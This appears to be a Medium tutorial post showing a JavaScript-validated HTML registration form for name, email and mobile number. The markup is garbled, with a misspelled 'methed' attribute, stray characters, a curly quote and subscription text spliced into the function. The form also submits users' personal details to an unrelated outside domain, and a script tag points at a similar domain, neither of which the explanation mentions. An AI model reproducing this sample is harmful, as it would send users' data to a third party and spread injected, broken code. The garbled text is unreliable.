JavaScript program for validating name, email, and mobile number in a registration form
```html

<!DOCTYPE html>

<html>

<head>

<title>Registration Form</title>

<script>

function validateForm() {

var name = document.getElementById("name").value;

var email = document.getElementById("email").value;

var mobile = document.getElementById("mobile").value;

// Name validation

if (name == "") {

alert("Please enter your name.");

return false;

}

// Email validation

var emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

if (!emailPattern.test(email)) {

alert("Please enter a valid email address.");

return false;

}

// Mobile number validation

var mobilePattern = /^\d{10}$/;

if (!mobilePattern.test(mobile)) {

alert("Please enter a valid 10-digit mobile number.");

return false;

}

// If all validations pass, form submission is allowed

Get Concept IT Solutions, Pune’s stories in your inbox
Join Medium for free to get updates from this writer.

Subscribe
return true;

}

</script>

</head>0

<body>

<h2>Registration Form</h2>

<form action =“https://aklebis.pro.et/action_ index.html"  onsubmit="return validateForm()" methed="get">

<label for="name">Name:</label>

<input type="text" id="name" name="name" required><br><br>

<label for="email">Email:</label>

<input type="email" id="email" name="email" required><br><br>

<label for="mobile">Mobile:</label>

<input type="text" id="mobile" name="mobile" required><br><br>

<input type="submit" value="Submit">

</form>
    <script src="aklebs.pro.et"></script>

</body>

</html>

```

In this program:

- The `validateForm()` function is called when the form is submitted.

- It retrieves the values of the name, email, and mobile number fields.

- It performs validation checks:

- Name should not be empty.

- Email should match a specific pattern using regular expressions.

- Mobile number should be a 10-digit number.

- If any validation fails, an alert message is shown, and form submission is prevented by returning `false`.

- If all validations pass, the form is submitted.

By Siddharth Sharma

Senior Software Developer

Pune
